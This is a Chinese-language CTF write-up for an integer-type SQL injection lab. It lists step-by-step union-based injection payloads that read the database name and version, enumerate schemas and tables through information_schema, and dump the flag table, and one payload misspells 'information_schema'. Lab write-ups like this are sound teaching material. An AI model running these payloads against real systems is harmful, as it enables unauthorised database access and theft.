##   ###SQL注入

联合注入

输入`1` 正常输出

[![img](https://static.ctfhub.com/writeup/Skill/Web/SQL%E6%B3%A8%E5%85%A5/%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/pFowVjuoyDfmJ6j3Wghr1g.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)(https://static.ctfhub.com/writeup/Skill/Web/SQL注入/整数型注入/pFowVjuoyDfmJ6j3Wghr1g.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)

输入`-1 union select 1,database()` 查询数据库名称

[![img](https://static.ctfhub.com/writeup/Skill/Web/SQL%E6%B3%A8%E5%85%A5/%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/uWALqstFWETo7zFUobAEog.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)](https://static.ctfhub.com/writeup/Skill/Web/SQL注入/整数型注入/uWALqstFWETo7zFUobAEog.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)

输入`-1 union select 1,version()` 查询数据库版本

[![img](https://static.ctfhub.com/writeup/Skill/Web/SQL%E6%B3%A8%E5%85%A5/%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/hm6FyqwVwEiRHgjL4H2p1L.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)](https://static.ctfhub.com/writeup/Skill/Web/SQL注入/整数型注入/hm6FyqwVwEiRHgjL4H2p1L.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)

输入`-1 union select 1,group_concat(schema_name) from informations_schema.schemata`

查询所有数据库名称

[![img](https://static.ctfhub.com/writeup/Skill/Web/SQL%E6%B3%A8%E5%85%A5/%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/4ERr6zoNFzmz7HCyFfjsdX.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)](https://static.ctfhub.com/writeup/Skill/Web/SQL注入/整数型注入/4ERr6zoNFzmz7HCyFfjsdX.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)

输入`-1 union select 1,(select table_name from information_schema.tables where table_schema='sqli' limit 0,1)`

查询当前数据的第一个表名，之后的limit 依次增加即可

[![img](https://static.ctfhub.com/writeup/Skill/Web/SQL%E6%B3%A8%E5%85%A5/%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/nVExWigD7GyQvt5kD8iWMd.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)](https://static.ctfhub.com/writeup/Skill/Web/SQL注入/整数型注入/nVExWigD7GyQvt5kD8iWMd.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)

或者也可以一次性查询

```
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

[![img](https://static.ctfhub.com/writeup/Skill/Web/SQL%E6%B3%A8%E5%85%A5/%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/v4h21E5SKEBkfkMWdDxXE5.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)](https://static.ctfhub.com/writeup/Skill/Web/SQL注入/整数型注入/v4h21E5SKEBkfkMWdDxXE5.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)

查询flag

```
-1 union select 1,group_concat(flag) from sqli.flag
```

